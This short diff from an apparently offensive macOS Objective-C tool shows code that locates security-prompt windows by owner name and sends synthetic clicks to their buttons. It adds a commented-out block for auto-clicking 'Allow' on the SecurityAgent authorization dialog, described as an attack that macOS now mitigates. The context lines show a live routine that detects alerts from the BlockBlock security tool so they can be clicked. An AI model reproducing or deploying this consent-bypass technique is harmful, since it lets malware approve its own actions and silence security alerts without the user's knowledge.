@@ -69,6 +69,13 @@ int main(int argc, const char * argv[]) {
                 clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340), oldLocation);
             }
             
+            // SecurityAgent (not working since macOS do have a mitigation against this attack)
+            /*if([kCGWindowOwnerName isEqualToString:@"SecurityAgent"] && [kCGWindowLayer intValue] == 1000 && [kCGWindowIsOnscreen intValue] == 1) {
+             
+             // Window is present, click on the button "Allow"
+             clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 394, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 170), oldLocation);
+             }*/
+            
             // BlockBlock detection
             if([kCGWindowOwnerName isEqualToString:@"BlockBlock"] && [kCGWindowLayer intValue] == 3 && [kCGWindowIsOnscreen intValue] == 1) {
                 
